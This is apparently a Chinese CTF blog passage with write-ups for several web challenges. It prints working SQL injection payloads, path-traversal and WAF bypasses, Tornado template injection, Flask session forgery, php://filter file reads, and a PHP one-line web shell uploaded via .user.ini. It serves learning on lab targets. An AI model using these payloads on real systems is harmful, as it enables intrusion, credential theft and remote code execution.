class="keyword">false</span>;</span><br></pre></td></tr></table></figure><p>从源码可知先对传入的字符串末尾加？号，进行以？为分割符进行字符串截取，接着url解码，然后再次加？号以？为分割符进行字符串截取，最后在进行白名单的判断。我们可以传入一个url编码后的?，前面连接放着白名单的文件，就可以绕过白名单的判断返回True,后面放着我们想要读取的字符串。浏览器会默认帮我们url解码一次，随意我们要将? 二次url编码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>可得flag<br>我这里对？进行一次url编码可以，倒是有点奇怪，不是会默认解码一次吗?<br>这里还涉及到一个知识点:<br>hint.php%3f双重编码,经过包含时你包含的文件会被当成一个目录</p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>在注入测试中，可以发现增、删、查、改操作的关键字都被过滤了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;select|update|delete|drop|insert|where|\.&#x2F;i&quot;,$inject);</span><br></pre></td></tr></table></figure><p>可以使用堆叠注入<br>得到表名1919810931114514、words</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1';  <span class="keyword">show</span> <span class="keyword">tables</span>; <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>得到字段名  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1';  desc 1919810931114514 <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>1919810931114514表有1，hahahah两个字段<br>得到数据   </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1'; <span class="keyword">SET</span> @haha_test = <span class="keyword">CONCAT</span>(<span class="string">'S'</span>,<span class="string">'ELECT * from `1919810931114514`'</span>);<span class="keyword">PREPARE</span> pr2 <span class="keyword">FROM</span> @haha_test;<span class="keyword">EXECUTE</span> pr2 ;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p>这道题一开始以为是盲注， 没做出来，看大佬们的WP.<br>这题目源码 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>重点在 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">select</span> <span class="string">".$post['query']."</span>||flag <span class="keyword">from</span> Flag<span class="string">";</span></span><br></pre></td></tr></table></figure><p>解法一:<br>这里没有过滤<code>*</code> ，直接 <code>*</code>,1就可以了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1 =&gt; "select *,1||flag from Flag"; (1和flag或运算，select * from Flag)</span><br></pre></td></tr></table></figure><p>解法二：<br>更改配置把||视为字符串连接符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=pipes_as_concat;<span class="keyword">select</span> <span class="number">1</span>   </span><br><span class="line">=&gt;<span class="string">"select 1;set sql_mode=pipes_as_concat;select 1||flag from Flag"</span>;</span><br></pre></td></tr></table></figure><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能。</p><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>有三个文件<br>flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;flag.txt</span><br><span class="line">flag in &#x2F;fllllllllllllag</span><br></pre></td></tr></table></figure><p>welcome.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;welcome.txt</span><br><span class="line">render</span><br></pre></td></tr></table></figure><p>hints.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;hints.txt</span><br><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure><p>提示flag就在/fllllllllllllag 访问跳到 /error?msg=Error ,猜测有模板注入<br>尝试输入/error?msg=1，确实存在模板注入。<br>Python tornado框架存在附属文件 handler.settings,于是尝试输入/error?msg=<br>返回   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'autoreload'</span>: True, <span class="string">'compiled_template_cache'</span>: False, <span class="string">'cookie_secret'</span>: <span class="string">'6cf024f5-e2ff-4c16-8989-5b16c648ca74'</span>&#125;</span><br></pre></td></tr></table></figure><p>根据hints.txt的提示，依据观察三个文件的url地址可知，需要按照如下访问，才可以得到文件的内容。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;文件名&amp;filehash&#x3D;md5(cookie_secret+md5(文件名))</span><br></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5hash(data):</span><br><span class="line">    md5&#x3D;hashlib.md5()</span><br><span class="line">    md5.update(data)</span><br><span class="line">    print(md5.hexdigest())</span><br><span class="line">    return  md5.hexdigest()</span><br><span class="line"></span><br><span class="line">def filehash(filename):</span><br><span class="line">    cookie_secret &#x3D; &quot;6cf024f5-e2ff-4c16-8989-5b16c648ca74&quot;</span><br><span class="line">    result&#x3D;md5hash((cookie_secret + md5hash(filename.encode(&#39;utf-8&#39;))).encode(&#39;utf-8&#39;))</span><br><span class="line">    return  result</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    filename &#x3D; &quot;&#x2F;fllllllllllllag&quot;</span><br><span class="line">    result&#x3D;&quot;&#x2F;file?filename&#x3D;&#123;&#125;&amp;filehash&#x3D;&#123;&#125;&quot;</span><br><span class="line">    print(result.format(filename,filehash(filename)))</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;232236da1a1b017078826b86cced846a</span><br></pre></td></tr></table></figure><p>可得到flag</p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>存在sql注入，万能密码登录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=orandin<span class="string">'  or '</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>查看html源码，可知有calc.php文件，访问可得waf的过滤方式  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>tips:<br>PHP的字符串解析特性:<br> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符  2.将某些字符转换为下划线（包括空格）  </p><p> num参数的值如果为字母就会显示页面请求就会错误。可以猜测这里的waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。（主要是waf不是用php写的）   </p><p> answer:<br> 首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是/被过滤了，所以我们用chr(47)绕过,发现flagg文件<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%<span class="number">20</span>num=<span class="number">1</span>;var_dump(scandir(chr(<span class="number">47</span>)))</span><br></pre></td></tr></table></figure><br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/calc.php?%<span class="number">20</span>num=var_dump(file_get_contents(chr(<span class="number">47</span>).chr(<span class="number">102</span>).chr(<span class="number">49</span>).chr(<span class="number">97</span>).chr(<span class="number">103</span>).chr(<span class="number">103</span>)))</span><br></pre></td></tr></table></figure></p><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">        &lt;!--</span><br><span class="line">$cat=$_GET[<span class="string">'cat'</span>];</span><br><span class="line"><span class="keyword">echo</span> $cat;</span><br><span class="line"><span class="keyword">if</span>($cat==<span class="string">'dog'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>answer:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cat&#x3D;dog</span><br></pre></td></tr></table></figure><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>随便注册一个账号登录，在修改密码的地方，提示源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">HCTF2018-admin</a></p><p>解法一：session伪造<br>注册一个账号后登入，抓包得到cookie的session,解密得 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'_fresh'</span>: <span class="literal">True</span>, <span class="string">'_id'</span>: <span class="string">b'fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28'</span>, <span class="string">'csrf_token'</span>: <span class="string">b'6298f03ac923b6b7006403d7a5ca798a645e338e'</span>, <span class="string">'image'</span>: <span class="string">b'V7hq'</span>, <span class="string">'name'</span>: <span class="string">'test'</span>, <span class="string">'user_id'</span>: <span class="string">'10'</span>&#125;</span><br></pre></td></tr></table></figure><p>如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，在config.py里可以发现了SECRET_KEY。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure><p>一个flask session加密的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>             </p><p>利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session即可<br>加密     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28&#39;, &#39;csrf_token&#39;: b&#39;6298f03ac923b6b7006403d7a5ca798a645e338e&#39;, &#39;image&#39;: b&#39;V7hq&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;</span><br></pre></td></tr></table></figure><p>解法二： unicode </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>假如我们注册ᴬᴰᴹᴵᴺ用户，然后在用ᴬᴰᴹᴵᴺ用户登录，因为在login函数里使用了一次nodeprep.prepare函数，因此我们登录上去看到的用户名为ADMIN，此时我们再修改密码，又调用了一次nodeprep.prepare函数将name转换为admin，然后我们就可以改掉admin的密码，最后利用admin账号登录即可拿到flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>用bp截取数据吧，在302跳转的页面得知secr3t.php </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   secr3t.php        </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>访问secr3t.php得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>利用php://filter的php伪协议读取   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><h1 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h1><p>联合注入  #在get请求中记得url编码，要不会被当成锚点   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;666f93b7-713c-4980-819e-74815fd17c90.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin&amp;password&#x3D;dfg&#39; union select 1,(select group_concat(username,0x23,password) from l0ve1ysq1),3 %23</span><br></pre></td></tr></table></figure><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>源码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;/h2&gt;</span><br><span class="line">    &lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">"file"</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">        &lt;input type=<span class="string">"file"</span> name=<span class="string">"fileUpload"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=<span class="string">"submit"</span> name=<span class="string">"upload"</span> value=<span class="string">"提交"</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line">$userdir = <span class="string">"uploads/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . <span class="string">"/index.php"</span>, <span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"fileUpload"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">if</span> (!$tmp_name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filesize too big!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!$name) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"filename cannot be empty!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/ph|htacess/i"</span>, $extension)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"illegal suffix!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos(file_get_contents($tmp_name), <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&amp;lt;? in contents!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (!$image_type) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"exif_imagetype:not image!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . <span class="string">"/"</span> . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Your dir "</span> . $userdir. <span class="string">' &lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'Your files : &lt;br&gt;'</span>;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tips:  </p><p>1.exif_imagetype 文件类型判断<br>可以通过给上传脚本加上相应的幻数头字节就可以绕过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JPG ：FF D8 FF E0 00 10 4A 46 49 46</span><br><span class="line">GIF(相当于文本的GIF89a)：47 49 46 38 39 61</span><br><span class="line">PNG： 89 50 4E 47</span><br></pre></td></tr></table></figure><p>2.user.ini<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini详解介绍</a>   </p><p>answer:<br>首先，构造一个.user.ini文件，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a             </span><br><span class="line">auto_prepend_file=a.jpg</span><br></pre></td></tr></table></figure><p>然后构造一个a.jpg，内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">'php'</span>&gt; @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">'pass'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后将两个文件分别上传到服务器上，拿到回显1</p><p>菜刀连接本就存在的index.php文件 ，该index.php会包含a.jpg里面的一句话</p><h1 id="极客大挑战-2019-PHP1"><a href="#极客大挑战-2019-PHP1" class="headerlink" title="[极客大挑战 2019]PHP1"></a>[极客大挑战 2019]PHP1</h1><p>有<a href="http://www.zip备份文件" target="_blank" rel="noopener">www.zip备份文件</a><br>index.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">$select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">$res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 